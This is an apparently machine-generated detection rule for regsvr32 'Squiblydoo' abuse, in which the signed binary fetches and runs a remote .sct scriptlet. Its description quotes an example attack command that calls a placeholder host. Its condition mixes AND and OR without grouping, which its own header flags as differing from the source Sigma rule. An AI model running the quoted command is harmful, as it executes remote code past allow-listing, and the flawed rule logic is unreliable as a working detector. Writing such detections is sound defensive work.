// Generated by scripts/convert_rules.py from rules/sigma/stealth/proc_creation_win_regsvr32_scrobj_remote_sct.yml. Do not edit by hand.
// DO NOT DEPLOY: AND/OR precedence differs from the Sigma rule.
rule regsvr32_loading_scriptlet_via_scrobj_dll_squiblydoo {
  meta:
    id = "b01cf729-c18a-4ddf-8b88-543b67545efd"
    title = "Regsvr32 Loading Scriptlet Via Scrobj.dll (Squiblydoo)"
    description = "Detects regsvr32.exe called with the /i: switch together with scrobj.dll, a .sct scriptlet, or a URL, e.g. 'regsvr32 /s /n /u /i:http://host/file.sct scrobj.dll'. This 'Squiblydoo' technique makes the signed regsvr32.exe download and run a COM scriptlet, bypassing application allow-listing. Normal regsvr32 use registers a local DLL and does not combine /i: with scrobj.dll or a remote location."
    author = "Aryan Dhuru"
    reference = "https://attack.mitre.org/techniques/T1218/010/, https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"
    date = "2026-10-14"
    tags = "attack.stealth, attack.t1218.010"
    severity = "high"
    falsepositives = "Rare. Some legacy installers pass /i: with an install argument; those reference a local DLL, not scrobj.dll or a URL."

  events:
    $event1.metadata.event_type = "PROCESS_LAUNCH"
    ($event1.target.process.file.full_path = /\\regsvr32\.exe$/ nocase OR $event1.target.process.file.names = "REGSVR32.EXE" nocase) AND $event1.target.process.command_line = / -i:/ nocase OR $event1.target.process.command_line = / \/i:/ nocase OR $event1.target.process.command_line = / –i:/ nocase OR $event1.target.process.command_line = / —i:/ nocase OR $event1.target.process.command_line = / ―i:/ nocase AND $event1.target.process.command_line = /scrobj|\.sct|http:\/\/|https:\/\/|ftp:\/\// nocase

  conditions:
    $event1
}
